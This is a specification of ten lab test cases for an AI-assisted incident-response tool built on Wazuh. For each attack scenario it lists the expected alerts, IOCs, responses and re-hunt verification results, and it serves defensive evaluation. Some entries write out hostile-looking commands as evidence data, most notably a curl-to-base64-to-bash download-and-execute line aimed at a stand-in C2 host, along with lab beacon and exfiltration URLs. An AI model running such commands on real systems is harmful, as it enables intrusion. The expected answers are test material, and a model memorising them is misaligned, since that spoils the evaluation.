# evaluation-scenarios-v2 — Scenario Specification (TC-01 … TC-10)

Status of this document: **specification + validation only**. Nothing in VIGIX (agent, prompt, validator, policy, catalog, re-hunt adapter, evaluator, metrics, ground truth) was changed to produce it.
Sources (all pre-existing, none derived from AI output): ground truth `apps/backend/src/evaluation/groundTruthReal.ts` (SHA-256 `ddb18d5d4dee4ffe…`, identical in the final and Mock v2 runs), simulations `apps/backend/scripts/eval/simulations.ts`,
custom rules `infra/docker/wazuh-manager/vigix_eval_*.xml`, re-hunt adapter `apps/backend/src/infrastructure/external-services/siem/WazuhRehuntAdapter.ts`, IOC extraction `apps/backend/src/domain/investigation/alertIocs.ts`,
and the raw alerts/IOCs actually observed in `soar_mockv2_eval` (Mock v2 run `results/runs/mock-evaluation-v2-20261002/`) used **only to check that the specified evidence really exists**.

## 0. Shared facts (apply to every case)
- **Environment placeholders:** `@ATTACKER_IP`, `@ENDPOINT_IP`, `@TESTSERVER_IP` are container IPs resolved before the attack (they change after Docker restarts; in the Mock v2 run attacker `172.19.0.7`, endpoint `172.19.0.6`, test server `172.19.0.5`). Alert field semantics for network cases: `data.srcip` = initiator, `data.dstip` = destination.
- **Re-huntable IOC types (what `REHUNT_PROVIDER=wazuh` can search)** — adapter `WazuhRehuntAdapter.ts:7-12,22-26` and `REHUNT_IOC_TYPES` `alertIocs.ts:93`:
  | VIGIX IOC type | searched fields |
  |---|---|
  | IPV4 / IPV6 | `data.srcip`, `data.dstip`, `data.win.eventdata.sourceIp`, `…destinationIp` |
  | DOMAIN | `data.dns.question.name`, `data.domain`, `data.win.eventdata.queryName` |
  | URL | `data.url`, `data.http.url` |
  | HASH / MD5 / SHA1 / SHA256 | `data.md5`, `data.sha1`, `data.sha256`, `data.hash`, `syscheck.md5_after`, `syscheck.sha1_after`, `syscheck.sha256_after` |
  | **NOT searchable:** USERNAME, FILE_PATH, PROCESS_NAME, COMMAND_LINE, EMAIL, HTTP_REQUEST, REGISTRY_* | — (an incident with none of the four searchable types fails with `REHUNT_INSUFFICIENT_CRITERIA`, never a silent NO_MATCH) |
- **Re-hunt query (all cases):** exact-term search of the searchable IOCs of the incident + the response target (if IP/hash/URL) + the alert's rule, in the window `[response.completedAt, now]`; the alerting endpoint's own identity (agent name/IP) is excluded. Result mapping: `matchingEvents = 0`, no spread, no IOC recurrence, threat contained → `RESOLVED`; recurrence → `NOT_RESOLVED`; spread → `SPREAD`.
  Sensitivity is demonstrated by the recurrence control run (`control-recurrence-real-wazuh-20260930`, TC-01: attack repeated after response → `NOT_RESOLVED`, 29 matching events).
- **Human decision (all cases):** IR_TEAM approval under POL-A01; the AI never approves/executes. In the harness the SOC/IR steps are scripted stand-ins and labelled so. "Response" = manual response simulation recorded as a completed ticket (no real block is applied).
- **Verification expectation rule:** `RESOLVED` is expected only because the re-hunt finds nothing after the response in an environment where the attack is not repeated — never because the action was executed.
- **Expected final state rule:** `resolved` only with a `RESOLVED` real re-hunt; `open` (investigating) when the re-hunt cannot run or finds recurrence; `escalated` only after 3 NOT_RESOLVED rounds (tested separately in the extended evaluation).

---

## TC-01 Brute Force (SSH)
| Field | Specification |
|---|---|
| Case ID / Attack type | TC-01 / SSH_BRUTE_FORCE — Authentication investigation |
| Scenario description | External host repeatedly guesses SSH passwords for invalid users on the endpoint |
| Attack preconditions | attacker container can reach `attack-endpoint` sshd; Wazuh agent active; stock ruleset 4.9.2 |
| Attack simulation | 10 invalid-user logins (`admin, oracle, test, git, postgres, ubuntu, deploy, backup, user1, support`) with wrong passwords, attacker → endpoint |
| Expected Wazuh alert | stock rule **5712**, level 10, MITRE T1110, `location=/var/log/auth.log` (observed: `data.srcip=@ATTACKER_IP`, `data.srcuser=<8th user>`) |
| Expected evidence | auth.log failure lines, `data.srcip`, `data.srcuser` |
| Expected IOC | IPV4 `@ATTACKER_IP`, USERNAME (any attempted user — rule fires on the 8th failure) |
| Expected investigation findings | repeated failed SSH authentication from one source; MITRE T1110; severity medium (from Wazuh level, not AI) |
| Expected MITRE | T1110 |
| Expected recommendation | playbook PB-SSH-BRUTEFORCE; allowed actions {BLOCK-SOURCE-IP, DISABLE-ACCOUNT} |
| Expected action / target | `ACT-BLOCK-SOURCE-IP` → IP `@ATTACKER_IP` (role **source**, from `data.srcip`) |
| Expected policy / playbook | POL-A01 approval, POL-A02/A03 action compliance / PB-SSH-BRUTEFORCE |
| Expected human decision | IR_TEAM approves |
| Expected response | manual response ticket COMPLETED |
| Expected verification | REAL_WAZUH re-hunt |
| Expected re-hunt query | IPV4 `@ATTACKER_IP` on `data.srcip`/`data.dstip`, since response completion |
| Expected re-hunt result | NO_MATCH → `RESOLVED` (attack not repeated); recurrence control → `NOT_RESOLVED` |
| Expected final state | `resolved` |

## TC-02 Malware (file / hash)
| Field | Specification |
|---|---|
| Case ID / Attack type | TC-02 / MALWARE — File / hash investigation |
| Scenario description | A user-downloaded executable-looking file (`Invoice_Q4_2026.xls.exe`) appears in `/root/Downloads`; content is the EICAR test string (harmless industry AV test file, not malware) |
| Attack preconditions | endpoint FIM (syscheck realtime) monitors `/root/Downloads`; custom rule 100301 loaded |
| Attack simulation | write exact EICAR bytes to `/root/Downloads/Invoice_Q4_2026.xls.exe` (sha256 equals the published EICAR hash; verified by the harness) |
| Expected Wazuh alert | custom rule **100301**, level 12, MITRE T1204.002, `location=syscheck` (CUSTOM_RULE_REAL_ACTION: real file, real FIM event) |
| Expected evidence | `syscheck.path`, `syscheck.sha256_after` = `275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f`, md5/sha1, size, mtime, owner, host `attack-endpoint` — **all verified present in the observed alert** (File Path ✔, File Name ✔ (basename of path), File Hash ✔, Host ✔, Timestamp ✔, Wazuh alert ✔) |
| Expected IOC | HASH sha256 above; FILE_PATH `/root/Downloads/Invoice_Q4_2026.xls.exe` |
| Expected investigation findings | executable masquerading as a document, dropped to Downloads, hash equals EICAR; host attack-endpoint |
| Expected MITRE | T1204.002 |
| Expected recommendation | playbook PB-MALWARE; allowed actions {ISOLATE-ENDPOINT, BLOCK-DOMAIN, BLOCK-URL, BLOCK-SOURCE-IP, KILL-PROCESS, QUARANTINE-FILE, BLOCK-HASH, BLOCK-DESTINATION-IP} |
| Expected action / target | preferred `ACT-QUARANTINE-FILE` → FILE `/root/Downloads/Invoice_Q4_2026.xls.exe` and `ACT-BLOCK-HASH` → HASH `275a021b…`; `ISOLATE-ENDPOINT` → HOST `attack-endpoint` is allowed. Targets must come from evidence only (no guessed hash/file) |
| Expected policy / playbook | POL-A01 approval; impact-level policy for endpoint actions / PB-MALWARE |
| Expected human decision | IR_TEAM approves |
| Expected response | manual response ticket COMPLETED (file removed/quarantined in the lab) |
| Expected verification | REAL_WAZUH re-hunt |
| Expected re-hunt query | HASH `275a021b…` on `syscheck.sha256_after` (+ response target if hash), since response completion |
| Expected re-hunt result | NO_MATCH → `RESOLVED`; re-creating the file → `NOT_RESOLVED` |
| Expected final state | `resolved` (requires the hash to reach the re-hunt as an IOC — see validation report: currently **not extracted**) |

## TC-03 Phishing (e-mail / URL / user)
| Field | Specification |
|---|---|
| Case ID / Attack type | TC-03 / PHISHING — E-mail / URL / user investigation |
| Scenario description | A credential-phishing e-mail from a look-alike domain, with SPF fail / no DKIM, is delivered to `hr.clerk@corp.local` |
| Attack preconditions | custom rule 100310 loaded; JSON log `/var/log/vigix-eval/events.json` monitored |
| Attack simulation | **controlled mail-gateway telemetry** (no real e-mail, no real traffic): one JSON event with URL, domain, sender e-mail, recipient, sending MTA `203.0.113.45` (RFC 5737 documentation address) |
| Expected Wazuh alert | custom rule **100310**, level 10, MITRE T1566.002 (CUSTOM_RULE_CONTROLLED_TELEMETRY) |
| Expected evidence | `data.url`, `data.dns.question.name`, `data.email.{from,to,subject}`, `data.srcip`, message with SPF/DKIM result |
| Expected IOC | URL `http://vigix-eval-phish.net/o365/verify?id=hr.clerk`, DOMAIN `vigix-eval-phish.net`, IPV4 `203.0.113.45`, EMAIL `it-support@vigix-eval-phish.net` |
| Expected investigation findings | phishing URL delivered to a user, sender spoofing indicators, MITRE T1566.002 |
| Expected MITRE | T1566.002 |
| Expected recommendation | playbook PB-PHISHING; allowed {QUARANTINE-EMAIL, BLOCK-URL, BLOCK-DOMAIN, RESET-CREDENTIAL, REVOKE-SESSION, DISABLE-ACCOUNT, ISOLATE-ENDPOINT} |
| Expected action / target | preferred `BLOCK-URL` → URL, `BLOCK-DOMAIN` → DOMAIN, `QUARANTINE-EMAIL` → EMAIL `it-support@vigix-eval-phish.net` (needs an evidence-backed EMAIL target — documented in ground truth as a finding/intervention if not linked) |
| Expected policy / playbook | POL-A01 approval / PB-PHISHING |
| Expected human decision | IR_TEAM approves |
| Expected response | manual response ticket COMPLETED |
| Expected verification | REAL_WAZUH re-hunt |
| Expected re-hunt query | URL on `data.url`, DOMAIN on `data.dns.question.name`, IPV4 on `data.srcip` (EMAIL is not searchable), since response completion |
| Expected re-hunt result | NO_MATCH → `RESOLVED` |
| Expected final state | `resolved` |

## TC-04 Account Compromise
| Field | Specification |
|---|---|
| Case ID / Attack type | TC-04 / ACCOUNT_COMPROMISE — Account / authentication investigation |
| Scenario description | Password guessing against account `victim` ends with a successful login from the same external source |
| Attack preconditions | account `victim` exists on the endpoint with a known password (lab fixture) |
| Attack simulation | 9 wrong-password SSH logins for `victim` then one successful login, attacker → endpoint |
| Expected Wazuh alert | stock rule **40112**, level 12, MITRE T1078 **and** T1110 (observed `data.srcip`, `data.dstuser=victim`) |
| Expected evidence | auth.log failures + `Accepted password for victim`, `data.srcip`, `data.dstuser` |
| Expected IOC | IPV4 `@ATTACKER_IP`, USERNAME `victim` |
| Expected investigation findings | successful authentication after a brute-force burst ⇒ compromised account |
| Expected MITRE | T1078 (alert also asserts T1110) |
| Expected recommendation | playbook PB-ACCOUNT-COMPROMISE (ground-truth note: PlaybookSelector ties between the two techniques and breaks the tie by fewest listed techniques, then code order; the attack intent is "compromised account"); allowed {DISABLE-ACCOUNT, BLOCK-SOURCE-IP, ISOLATE-ENDPOINT, RESET-CREDENTIAL, REVOKE-SESSION} |
| Expected action / target | preferred `DISABLE-ACCOUNT` → USER `victim`, `RESET-CREDENTIAL` → `victim`; `BLOCK-SOURCE-IP` → `@ATTACKER_IP` (role source) allowed |
| Expected policy / playbook | POL-A01 approval / PB-ACCOUNT-COMPROMISE |
| Expected human decision | IR_TEAM approves |
| Expected response | manual response ticket COMPLETED |
| Expected verification | REAL_WAZUH re-hunt |
| Expected re-hunt query | IPV4 `@ATTACKER_IP` (USERNAME not searchable) |
| Expected re-hunt result | NO_MATCH → `RESOLVED` |
| Expected final state | `resolved` |

## TC-05 PowerShell (Windows)
| Field | Specification |
|---|---|
| Case ID / Attack type | TC-05 / POWERSHELL — Process / command-line investigation |
| Scenario description | Encoded/obfuscated PowerShell executed on a Windows endpoint |
| Attack preconditions (required) | Windows endpoint; Wazuh agent 4.9.2 registered to the manager; PowerShell Script Block Logging enabled; `Microsoft-Windows-PowerShell/Operational` collected (eventchannel); Sysmon or equivalent process telemetry for process / parent / user / host |
| **Environment check (this session)** | registered agents: manager, `vigix-lab-agent`, `attack-endpoint` (Linux containers) + 2 disconnected container agents; no Windows agent. Local Windows host: no `WazuhSvc`, no `Sysmon`/`Sysmon64` service, `EnableScriptBlockLogging` not set, no `ossec-agent` directory ⇒ **ENVIRONMENT_UNAVAILABLE** |
| Attack simulation | benign calibration script exists (`apps/backend/scripts/eval/extended/windows/simulate-tc05.ps1`: harmless Base64 `-EncodedCommand`, no network/file/registry); **not executed**; no result fabricated |
| Expected Wazuh alert | **not yet specified** — rule id/level must be calibrated on a real Windows agent first (ground truth currently `ruleId n/a`); expected MITRE T1059.001 |
| Expected evidence / IOC / investigation findings | to be defined after calibration: command line, process, parent process, user, host (Windows `data.win.eventdata.*`); no IOC may be invented |
| Expected recommendation | playbook PB-POWERSHELL; allowed {ISOLATE-ENDPOINT, BLOCK-DOMAIN, BLOCK-URL, BLOCK-SOURCE-IP, DISABLE-ACCOUNT, KILL-PROCESS, QUARANTINE-FILE, BLOCK-HASH}; action/target: not specifiable before calibration |
| Expected policy / human decision / response | POL-A01, IR_TEAM approves, manual response |
| Expected verification / re-hunt | anticipated gap: process and command line are **not** re-huntable types; verification would only be possible if the telemetry also contains a hash, IP, domain or URL |
| Expected final state | n/a (not evaluable now) |

## TC-06 SQL Injection
| Field | Specification |
|---|---|
| Case ID / Attack type | TC-06 / SQL_INJECTION — Web / request investigation |
| Scenario description | Automated SQLi probing of the endpoint's web application |
| Attack preconditions | nginx on the endpoint with access log monitored; stock web rules active |
| Attack simulation | 12 `union select` GET requests (404) with `User-Agent: sqlmap/1.7` from the attacker container |
| Expected Wazuh alert | stock rule **31103**, level 7, MITRE T1190 (observed `data.srcip`, `data.url`, `data.protocol=GET`, full_log with 404 + sqlmap UA) |
| Expected evidence | access-log line, request URL, source IP, user agent |
| Expected IOC | IPV4 `@ATTACKER_IP` (the request path is recorded as HTTP_REQUEST — not searchable) |
| Expected investigation findings | SQL injection attempts by a scanning tool from one source, no successful response (404) |
| Expected MITRE | T1190 |
| Expected recommendation | playbook PB-SQL-INJECTION; allowed {BLOCK-SOURCE-IP} |
| Expected action / target | `ACT-BLOCK-SOURCE-IP` → `@ATTACKER_IP` (role source) |
| Expected policy / playbook | POL-A01 approval / PB-SQL-INJECTION |
| Expected human decision | IR_TEAM approves (a separate IR-reject variant exists in the final evaluation: IR rejects, then manual decision) |
| Expected response | manual response ticket COMPLETED |
| Expected verification / re-hunt | REAL_WAZUH; IPV4 `@ATTACKER_IP`, since response completion |
| Expected re-hunt result / final state | NO_MATCH → `RESOLVED` / `resolved` |

## TC-07 Command & Control
| Field | Specification |
|---|---|
| Case ID / Attack type | TC-07 / COMMAND_AND_CONTROL — Network / destination investigation |
| Scenario description | Endpoint beacons at a regular 2 s interval to an external C2 domain/server |
| Attack preconditions | isolated Docker test server mapped as `vigix-eval-c2.net` in the endpoint's `/etc/hosts`; custom rule 100320 |
| Attack simulation | 3 real HTTP beacons endpoint → test server `:8080/gate.php`; one JSON connection-telemetry line per beacon generated by the harness (CUSTOM_RULE_CONTROLLED_TELEMETRY) |
| Expected Wazuh alert | custom rule **100320**, level 13, MITRE T1071.001; fields `data.srcip=@ENDPOINT_IP` (source), `data.dstip=@TESTSERVER_IP` (destination), `data.dstport=8080`, `data.url`, `data.dns.question.name` |
| Expected evidence | beacon telemetry with interval 2 s, destination IP/port, URL, domain |
| Expected IOC | DOMAIN `vigix-eval-c2.net`, URL `http://vigix-eval-c2.net:8080/gate.php`, IPV4 `@TESTSERVER_IP` (destination); `@ENDPOINT_IP` is the victim/source |
| Expected investigation findings | periodic outbound beaconing to one destination; endpoint is the victim, test server is the C2 |
| Expected MITRE | T1071.001 |
| Expected recommendation | playbook PB-C2; allowed {BLOCK-DESTINATION-IP, BLOCK-DOMAIN, BLOCK-URL, ISOLATE-ENDPOINT} |
| Expected action / target | `BLOCK-DESTINATION-IP` → IP **`@TESTSERVER_IP` = `data.dstip`** (never the source/endpoint IP); `BLOCK-DOMAIN` → `vigix-eval-c2.net`; `BLOCK-URL`; `ISOLATE-ENDPOINT` → `attack-endpoint` allowed. Evidence source: `data.dstip` |
| Expected policy / playbook | POL-A01 approval / PB-C2 |
| Expected human decision | IR_TEAM approves |
| Expected response | manual response ticket COMPLETED |
| Expected verification / re-hunt | REAL_WAZUH; DOMAIN, URL, IPV4 `@TESTSERVER_IP` (endpoint IP excluded), since response completion |
| Expected re-hunt result / final state | NO_MATCH → `RESOLVED` / `resolved` |

## TC-08 Suspicious Process Execution
| Field | Specification |
|---|---|
| Case ID / Attack type | TC-08 / SUSPICIOUS_PROCESS_EXECUTION — Process / command-line / file investigation |
| Scenario description | A process masquerading as a kernel worker runs from a world-writable path as `www-data`, started by a shell running `curl … \| base64 -d \| bash` |
| Attack preconditions | endpoint can run the lab process; custom rule 100330; JSON log monitored |
| Attack simulation | real process `/tmp/.cache/kworkerd` (renamed `sleep`) as `www-data`, detached and verified alive; harmless pipeline against the test server (sink returns an empty body); telemetry generated from `/proc` in auditd layout `data.audit.*` (the index template maps `data.process` as an object, so a scalar `data.process` is rejected by the indexer) |
| Expected Wazuh alert | custom rule **100330**, level 10, MITRE T1059.004; observed fields `data.audit.exe`, `data.audit.command`, `data.audit.pid/ppid/uid`, `data.agent_host`, `data.message` (**no** `data.process`, `data.command`, hash, parent-process name, or `dns`/`url` field) |
| Expected evidence | process path, command line, pid/ppid, uid(user), host, timestamp (parent *name* and a file hash are **not** present in the telemetry) |
| Expected IOC | PROCESS `/tmp/.cache/kworkerd`, COMMAND_LINE `curl -s http://vigix-eval-c2.net:8080/x \| base64 -d \| bash` |
| Expected investigation findings | masquerading binary from a world-writable path executing a download-and-execute pipeline |
| Expected MITRE | T1059.004 |
| Expected recommendation | playbook PB-SUSPICIOUS-PROCESS; allowed {KILL-PROCESS, QUARANTINE-FILE, BLOCK-HASH, ISOLATE-ENDPOINT} |
| Expected action / target (target semantics) | `ACT-KILL-PROCESS` → **PROCESS** `/tmp/.cache/kworkerd` (requires COMMAND_LINE evidence); `ACT-QUARANTINE-FILE` → **FILE** `/tmp/.cache/kworkerd` (needs FILE_HASH evidence — absent from the telemetry); `ISOLATE-ENDPOINT` → **HOST** `attack-endpoint` is allowed. A host target for KILL-PROCESS or a process target for QUARANTINE-FILE is a type mismatch, not a correct answer |
| Expected policy / playbook | POL-A01 approval / PB-SUSPICIOUS-PROCESS |
| Expected human decision | IR_TEAM approves |
| Expected response | manual response ticket COMPLETED (process killed, file removed in the lab) |
| Expected verification / re-hunt | REAL_WAZUH. **Searchable criteria available:** none from the alert itself (no `dns`/`url`/IP/hash fields); only text-derived DOMAIN/URL IOCs exist and the telemetry has no field those would match |
| Expected re-hunt result | would be a NO_MATCH regardless of recurrence ⇒ a `RESOLVED` here would not demonstrate containment |
| Expected final state | not determinable by a sensitive verification with the current alert layout |

## TC-09 Data Exfiltration
| Field | Specification |
|---|---|
| Case ID / Attack type | TC-09 / DATA_EXFILTRATION — Network / destination / data-transfer investigation |
| Scenario description | A 3 MB file is uploaded from the endpoint to an external host |
| Attack preconditions | isolated Docker test server mapped as `vigix-eval-exfil.net`; custom rule 100340 |
| Attack simulation | synthetic 3 MB `/tmp/test-data.txt` (bytes 'A') POSTed over real HTTP to the test server (body discarded); transfer telemetry generated by the harness; temp file removed |
| Expected Wazuh alert | custom rule **100340**, level 13, MITRE T1048; `data.srcip=@ENDPOINT_IP` (source), `data.dstip=@TESTSERVER_IP` (destination), `data.url`, `data.dns.question.name`, `data.file`, `data.bytes_out=3145728`, `data.duration_seconds` |
| Expected evidence | transfer telemetry with bytes out, duration, destination, URL |
| Expected IOC | DOMAIN `vigix-eval-exfil.net`, URL `http://vigix-eval-exfil.net:8080/upload`, IPV4 `@TESTSERVER_IP` (destination), FILE_PATH `/tmp/test-data.txt` |
| Expected investigation findings | large outbound transfer to an external destination |
| Expected MITRE | T1048 |
| Expected recommendation | playbook PB-DATA-EXFIL; allowed {BLOCK-DESTINATION-IP, BLOCK-DOMAIN, BLOCK-URL, ISOLATE-ENDPOINT} |
| Expected action / target | `BLOCK-DESTINATION-IP` → IP **`@TESTSERVER_IP` = `data.dstip`** (never the source/endpoint IP); `BLOCK-DOMAIN` → `vigix-eval-exfil.net`; `BLOCK-URL`; `ISOLATE-ENDPOINT` allowed |
| Expected policy / playbook | POL-A01 approval / PB-DATA-EXFIL |
| Expected human decision | IR_TEAM approves |
| Expected response | manual response ticket COMPLETED |
| Expected verification / re-hunt | REAL_WAZUH; DOMAIN, URL, IPV4 `@TESTSERVER_IP`, since response completion |
| Expected re-hunt result / final state | NO_MATCH → `RESOLVED` / `resolved` |

## TC-10 Privilege Escalation
| Field | Specification |
|---|---|
| Case ID / Attack type | TC-10 / (ground-truth attack type) ACCOUNT_COMPROMISE — User / privilege investigation. Note: the scenario is a privilege change; the alert asserts T1098 which the KB maps to PB-ACCOUNT-COMPROMISE, **not** PB-PRIV-ESC (T1068/T1548) — recorded in the ground truth before any run |
| Scenario description | A newly created local account is added to the `sudo` group |
| Attack preconditions | custom decoder `vigix-usermod` + rule 100350 loaded (stock 4.9.2 has no rule for `usermod -aG sudo`; only useradd 5902/T1136 and FIM 550 fire) |
| Attack simulation | real `useradd -m evaluser`, then `usermod -aG sudo evaluser` on the endpoint (CUSTOM_RULE_REAL_ACTION); account removed in cleanup |
| Expected Wazuh alert | custom rule **100350**, level 14, MITRE T1098; observed `data.dstuser=evaluser`, `data.vigix_group=sudo`, `full_log` = `usermod[…]: add 'evaluser' to group 'sudo'` |
| Expected evidence | target user, new group (sudo), host, timestamp. **Not in the alert:** source user (who ran usermod), process path, parent process (the `usermod` command appears only inside `full_log`) |
| Expected IOC | USERNAME `evaluser` |
| Expected investigation findings | local account granted administrative privileges |
| Expected MITRE | T1098 |
| Expected recommendation | playbook PB-ACCOUNT-COMPROMISE; allowed {DISABLE-ACCOUNT, BLOCK-SOURCE-IP, ISOLATE-ENDPOINT, RESET-CREDENTIAL, REVOKE-SESSION} |
| Expected action / target | `ACT-DISABLE-ACCOUNT` → USER `evaluser` |
| Expected policy / playbook | POL-A01 approval / PB-ACCOUNT-COMPROMISE |
| Expected human decision | IR_TEAM approves |
| Expected response | manual response ticket COMPLETED |
| Expected verification / re-hunt | `INSUFFICIENT_REHUNT_CRITERIA`: the only IOC (USERNAME) is not a re-huntable type |
| Expected re-hunt result | cannot run; verification not created |
| Expected final state | `open` (investigating) under the current re-hunt capability |
